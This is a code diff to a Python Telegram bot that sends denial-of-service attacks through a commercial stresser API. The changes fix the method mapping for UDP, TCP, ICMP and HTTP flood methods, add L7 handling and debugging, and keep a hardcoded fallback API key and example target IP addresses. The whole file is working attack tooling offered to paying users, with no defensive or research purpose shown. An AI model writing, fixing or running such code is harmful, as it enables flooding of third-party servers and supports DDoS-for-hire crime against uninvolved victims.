@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH PROPER API COMMUNICATION
+# app.py - COMPLETE FIXED VERSION WITH CORRECT API METHOD MAPPING
 
 import os
 import logging
@@ -36,16 +36,16 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
-# CONCURRENT SETTINGS - MATCHES WEBSITE
+# CONCURRENT SETTINGS
 DEFAULT_CONCURRENT = 2  # Bot uses 2 concurrent
-MIN_CONCURRENT = 1
+MIN_CONCURRENT = 2
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
 MAX_DURATION = 300
 
-# ATTACK METHODS - EXACTLY AS WEBSITE
+# ATTACK METHODS - Display names for bot
 ATTACK_METHODS = [
-    "UDP-FLOOD",      # Maps to udp-flood
+    "UDP-FLOOD",
     "UDP-VSE", 
     "UDP-DNS",
     "TCP-SYN", 
@@ -61,23 +61,31 @@ ATTACK_METHODS = [
     "HTTP-BYPASSER"
 ]
 
-# API METHOD MAPPING - WEBSITE EXPECTS LOWER CASE
+# ===== CRITICAL FIX: CORRECT API METHOD MAPPING =====
+# API expects EXACT method names as shown in documentation
 METHOD_MAP = {
+    # UDP Methods - MUST be lowercase
     "UDP-FLOOD": "udp-flood",
     "UDP-VSE": "udp-vse", 
     "UDP-DNS": "udp-dns",
+    # TCP Methods - MUST be lowercase
     "TCP-SYN": "tcp-syn",
     "TCP-ACK": "tcp-ack",
     "TCP-STOMP": "tcp-stomp",
     "TCP-HANDSHAKE": "tcp-handshake",
+    # ICMP/GRE - MUST be lowercase
     "ICMP-FLOOD": "icmp-flood",
     "GRE-FLOOD": "gre-flood",
+    # L7 Methods - Keep as uppercase (API expects these exactly)
     "TLSV2": "TLSV2",
     "HTTPS-MIX": "HTTPS-MIX",
     "HTTP-KILLER": "HTTP-KILLER",
     "HTTP-DESTROYER": "HTTP-DESTROYER",
     "HTTP-BYPASSER": "HTTP-BYPASSER"
 }
+
+# Which methods are L7 (don't need port)
+L7_METHODS = ["TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"]
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -105,16 +113,13 @@ async def health():
         "remaining_time": stats['remaining_time']
     })
 
-@app.route('/concurrent')
-async def concurrent_status():
-    stats = attack_manager.get_stats()
+@app.route('/debug/last_request')
+async def debug_last_request():
+    """Debug endpoint to see last API request"""
     return jsonify({
-        "active_attack": stats['active_attack'],
-        "concurrent_value": stats['concurrent_value'],
-        "is_running": stats['is_running'],
-        "current_target": stats['current_target'],
-        "remaining_time": stats['remaining_time'],
-        "bot_default_concurrent": DEFAULT_CONCURRENT
+        "last_request": getattr(send_api_attack, 'last_request', None),
+        "last_response": getattr(send_api_attack, 'last_response', None),
+        "default_concurrent": DEFAULT_CONCURRENT
     })
 
 # ===== DATABASE =====
@@ -728,11 +733,11 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== FIXED API FUNCTIONS - MATCHES WEBSITE EXACTLY =====
+# ===== FIXED API FUNCTION WITH CORRECT METHOD MAPPING =====
 async def send_api_attack(target, port, duration, method, concurrent=2):
     """
-    Send attack to API with proper parameters matching website exactly
-    API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=2
+    Send attack to API with proper parameters
+    URL Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=CONCS
     """
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
@@ -740,24 +745,41 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
     if not api_key:
         return {"success": False, "error": "API Key missing"}
     
-    # Get the method name as expected by API (lowercase for UDP methods)
-    api_method = METHOD_MAP.get(method.upper(), "udp-flood")
+    # Get the correct method name for API
+    method_upper = method.upper()
+    api_method = METHOD_MAP.get(method_upper, "udp-flood")
     
-    # Build parameters EXACTLY like website
+    # For L7 methods, port might not be needed
+    is_l7 = method_upper in L7_METHODS
+    
+    # Build parameters EXACTLY as per API documentation
     params = {
         "key": api_key,
         "host": target,
-        "port": str(port),
         "time": str(duration),
         "method": api_method,
-        "concs": str(concurrent)  # CRITICAL: Website uses "concs" parameter
+        "concs": str(concurrent)  # IMPORTANT: "concs" parameter
     }
     
+    # Add port only for non-L7 methods
+    if not is_l7 and port:
+        params["port"] = str(port)
+    
     # Add advanced parameters for L7 methods
-    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
+    if is_l7:
         params["req_method"] = "GET"
         params["geoloc"] = "MIX"
         params["version"] = "1"
+    
+    # Store for debugging
+    send_api_attack.last_request = {
+        "url": api_url,
+        "params": params,
+        "concurrent": concurrent,
+        "method": method,
+        "api_method": api_method,
+        "is_l7": is_l7
+    }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -766,14 +788,19 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
         "Connection": "keep-alive"
     }
     
+    # Log the exact request
+    logger.info("=" * 60)
+    logger.info("🚀 SENDING API REQUEST")
+    logger.info(f"📡 URL: {api_url}")
+    logger.info(f"📡 PARAMS: {json.dumps(params, indent=2)}")
+    logger.info(f"🔄 CONCURRENT: {concurrent}")
+    logger.info(f"📡 METHOD: {method} -> {api_method}")
+    logger.info(f"🎯 TARGET: {target}:{port if not is_l7 else 'N/A'}")
+    logger.info(f"⏱️ DURATION: {duration}s")
+    logger.info("=" * 60)
+    
     connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
-    
-    # Log the exact request being sent
-    logger.info(f"🚀 Sending API Request:")
-    logger.info(f"📡 URL: {api_url}")
-    logger.info(f"📡 Params: {params}")
-    logger.info(f"🔄 Concurrent: {concurrent}")
     
     try:
         async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
@@ -791,10 +818,17 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                     except:
                         response_data = {"raw": response_text[:200]}
                     
-                    logger.info(f"📊 API Response Status: {response.status} in {elapsed:.2f}s")
-                    logger.info(f"📊 Response: {response_text[:200]}")
+                    # Store for debugging
+                    send_api_attack.last_response = {
+                        "status": response.status,
+                        "elapsed": elapsed,
+                        "data": response_data,
+                        "raw": response_text[:500]
+                    }
                     
-                    # Check if attack was successful
+                    logger.info(f"📊 API RESPONSE: {response.status} in {elapsed:.2f}s")
+                    logger.info(f"📊 RESPONSE: {response_text[:200]}")
+                    
                     if response.status == 200:
                         # Check for error in response
                         if isinstance(response_data, dict) and response_data.get('error'):
@@ -826,9 +860,10 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                         }
                         
     except asyncio.TimeoutError:
+        logger.error("❌ Request timeout")
         return {"success": False, "error": "Request timeout", "concurrent": concurrent}
     except Exception as e:
-        logger.error(f"API attack failed: {e}")
+        logger.error(f"❌ API attack failed: {e}")
         return {"success": False, "error": str(e)[:50], "concurrent": concurrent}
 
 # ===== ATTACK MANAGER =====
@@ -1261,7 +1296,7 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
             f"Min: {MIN_CONCURRENT}\n"
             f"Max: {MAX_CONCURRENT}\n\n"
             f"Usage: `/setconcurrent 4`\n"
-            f"Example: `/setconcurrent 2` (Matches website default)",
+            f"Example: `/setconcurrent 2`",
             parse_mode='Markdown'
         )
         return
@@ -1285,7 +1320,7 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
         await update.message.reply_text("❌ Invalid number!")
 
 async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test API with custom parameters"""
+    """Test API with custom parameters - Shows exact request/response"""
     user_id = update.effective_user.id
     
     if not db.is_owner_or_pseudo(user_id):
@@ -1300,8 +1335,8 @@ async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Examples:\n"
             f"`/testapi 91.108.9.213 32000 60` (Uses UDP-FLOOD default)\n"
             f"`/testapi 91.108.9.213 32000 60 4` (UDP-FLOOD with 4 concurrent)\n"
-            f"`/testapi 91.108.9.213 32000 60 12 TCP-SYN`\n"
-            f"`/testapi 91.108.9.213 32000 60 4 HTTP-KILLER`",
+            f"`/testapi 91.108.9.213 32000 60 12 TCP-SYN`\n\n"
+            f"🔍 This will show the exact API request being sent!",
             parse_mode='Markdown'
         )
         return
@@ -1328,12 +1363,34 @@ async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if method not in ATTACK_METHODS:
                 method = "UDP-FLOOD"
         
+        # Build the request info
+        api_method = METHOD_MAP.get(method.upper(), "udp-flood")
+        api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
+        api_url = os.getenv("API_URL", "https://mrstresser.com/api")
+        
+        is_l7 = method.upper() in L7_METHODS
+        
+        params = {
+            "key": api_key,
+            "host": target,
+            "time": str(duration),
+            "method": api_method,
+            "concs": str(concurrent)
+        }
+        
+        if not is_l7 and port:
+            params["port"] = str(port)
+        
+        full_url = f"{api_url}?{'&'.join([f'{k}={v}' for k, v in params.items()])}"
+        
         test_message = (
             f"🔬 *API TEST*\n\n"
-            f"📡 Target: `{target}:{port}`\n"
+            f"📡 Target: `{target}:{port if not is_l7 else 'N/A'}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"🔄 Concurrent: `{concurrent}`\n"
-            f"📡 Method: `{method}`\n\n"
+            f"📡 Method: `{method}` → `{api_method}`\n"
+            f"📡 Type: {'L7' if is_l7 else 'L4'}\n\n"
+            f"📝 *Request URL:*\n`{full_url[:200]}...`\n\n"
             f"⏳ Sending test request..."
         )
         
@@ -1345,21 +1402,23 @@ async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if result.get('success'):
             response_message = (
                 f"✅ *API TEST SUCCESSFUL*\n\n"
-                f"📡 Target: `{target}:{port}`\n"
+                f"📡 Target: `{target}:{port if not is_l7 else 'N/A'}`\n"
                 f"🔄 Concurrent: `{concurrent}`\n"
-                f"📡 Method: `{method}`\n"
+                f"📡 Method: `{method}` → `{api_method}`\n"
                 f"⚡ Status: `{result.get('status')}`\n"
                 f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
-                f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
+                f"📋 *API Response:*\n```json\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
+                f"🔍 *Concurrent in Response:* {result.get('concurrent', 'N/A')}\n"
             )
         else:
             response_message = (
                 f"❌ *API TEST FAILED*\n\n"
-                f"📡 Target: `{target}:{port}`\n"
+                f"📡 Target: `{target}:{port if not is_l7 else 'N/A'}`\n"
                 f"🔄 Concurrent: `{concurrent}`\n"
+                f"📡 Method: `{method}` → `{api_method}`\n"
                 f"❌ Error: `{result.get('error', 'Unknown error')}`\n"
                 f"📊 Status Code: `{result.get('status')}`\n\n"
-                f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:300]}\n```\n"
+                f"📋 *API Response:*\n```json\n{json.dumps(result.get('response', {}), indent=2)[:300]}\n```\n"
             )
         
         await status_msg.edit_text(response_message, parse_mode='Markdown')
@@ -1471,9 +1530,11 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['attack_method'] = method
     
     is_default = "⭐ DEFAULT" if method == "UDP-FLOOD" else ""
+    is_l7 = "🌐 L7" if method.upper() in L7_METHODS else "📦 L4"
     
     await query.edit_message_text(
-        f"📡 *Method Selected: {method}* {is_default}\n\n"
+        f"📡 *Method Selected: {method}* {is_default}\n"
+        f"📡 Type: {is_l7}\n\n"
         f"Send: `IP PORT TIME`\n"
         f"Example: `91.108.17.41 32001 60`\n\n"
         f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
@@ -2318,6 +2379,8 @@ if __name__ == "__main__":
     print("  /redeem CODE - Redeem premium code")
     print("=" * 60)
     print("📝 API Format: /api?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD&concs=CONCS")
+    print("📝 UDP Methods: udp-flood, udp-vse, udp-dns, tcp-syn, tcp-ack, etc.")
+    print("📝 L7 Methods: TLSV2, HTTPS-MIX, HTTP-KILLER, HTTP-DESTROYER, HTTP-BYPASSER")
     print("=" * 60)
     
     try:
